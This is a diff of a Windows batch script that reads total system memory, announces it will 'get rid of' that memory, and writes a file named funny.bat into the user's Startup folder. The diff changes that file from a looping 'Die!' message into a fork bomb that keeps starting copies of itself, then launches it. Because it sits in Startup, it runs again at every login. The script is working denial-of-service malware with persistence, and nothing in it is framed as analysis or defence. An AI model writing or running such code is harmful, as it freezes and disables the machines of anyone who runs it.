@@ -1,9 +1,9 @@
 @echo off 
-(
-  echo :funny
-  echo echo Die!
-  echo goto:funny
-) > funny.bat
+echo :funny > funny.bat
+echo cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" >> funny.bat
+echo start funny.bat >> funny.bat
+echo goto :funny >> funny.bat
+
 echo Calculating total system memory
 for /f "skip=1" %%p in ('wmic os get TotalVisibleMemorySize') do ( 
    set system_ram=%%p
@@ -19,12 +19,11 @@ set /a "c=%system_ram% - 28"
 
 echo Will be getting rid of %c% bytes of memory
 cd "%AppData%/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-echo Starting copy...
-(
-  echo :funny
-  echo echo Die!
-  echo goto:funny
-) > funny.bat
+echo :funny > funny.bat
+echo cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" >> funny.bat
+echo start funny.bat >> funny.bat
+echo goto :funny >> funny.bat
+
 echo Finished!
 start funny.bat
 echo Running...
